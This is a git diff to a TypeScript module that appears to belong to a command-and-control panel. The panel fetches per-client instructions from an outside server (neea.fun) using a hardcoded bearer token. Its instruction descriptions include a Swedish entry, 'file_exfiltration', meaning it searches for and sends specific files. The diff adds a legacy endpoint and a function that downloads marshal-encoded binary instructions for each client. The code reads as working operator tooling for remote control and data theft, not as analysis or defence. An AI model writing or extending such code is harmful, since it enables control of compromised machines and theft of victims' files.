@@ -1,3 +1,4 @@
+
 import { INSTRUCTION_CODE } from './scriptData';
 
 // Interface definitions
@@ -40,13 +41,15 @@ const INSTRUCTION_DESCRIPTIONS: Record<string, string> = {
   "file_exfiltration": "Söker och skickar specifika filer"
 };
 
-// Server configuration - Updated to match the Apache WSGI configuration
+// Server configuration - Updated to include both endpoint patterns
 const SERVER_BASE_URL = 'https://neea.fun';
 // API Endpoints aligned with the WSGI configuration in the Apache site config
 const API_CLIENTS_ENDPOINT = '/api/clients';
 const API_CLIENT_INSTRUCTION_ENDPOINT = '/api/clients/{clientId}/instruction';
 const API_CONFIG_ENDPOINT = '/api/get_config';
 const API_INSTRUCTIONS_ENDPOINT = '/api/instructions';
+// Legacy endpoint for backward compatibility
+const API_GET_INSTRUCTIONS_ENDPOINT = '/get_instructions';
 
 // Authentication token - Must match what the server expects
 const AUTH_TOKEN = 'SmpVdUpXMEZKTk5nT2CQWGh4SVFlM3lNUWtDUGZJeEtXM2VkU3RuUExwVg==';
@@ -103,6 +106,33 @@ export async function getScripts(): Promise<ScriptsData> {
     
     // Fallback to local instruction code
     return extractScriptsFromInstructionsPy();
+  }
+}
+
+// Get client instructions using the legacy endpoint (for backward compatibility)
+export async function getClientInstructions(clientId: string): Promise<ArrayBuffer | null> {
+  try {
+    console.log(`Fetching instructions for client ${clientId} using legacy endpoint`);
+    
+    // Use the legacy endpoint with client_id query parameter
+    const response = await fetch(`${SERVER_BASE_URL}${API_GET_INSTRUCTIONS_ENDPOINT}?client_id=${clientId}`, {
+      headers: {
+        'Authorization': `Bearer ${AUTH_TOKEN}`,
+        'Accept': '*/*'  // Accept any content type since we're expecting binary data
+      }
+    });
+    
+    if (!response.ok) {
+      console.warn(`Failed to fetch client instructions: ${response.status} ${response.statusText}`);
+      throw new Error(`Failed to fetch client instructions: ${response.status} ${response.statusText}`);
+    }
+    
+    // Return the raw ArrayBuffer for marshal-encoded data
+    return await response.arrayBuffer();
+    
+  } catch (error) {
+    console.error(`Error fetching instructions for client ${clientId}:`, error);
+    return null;
   }
 }
 
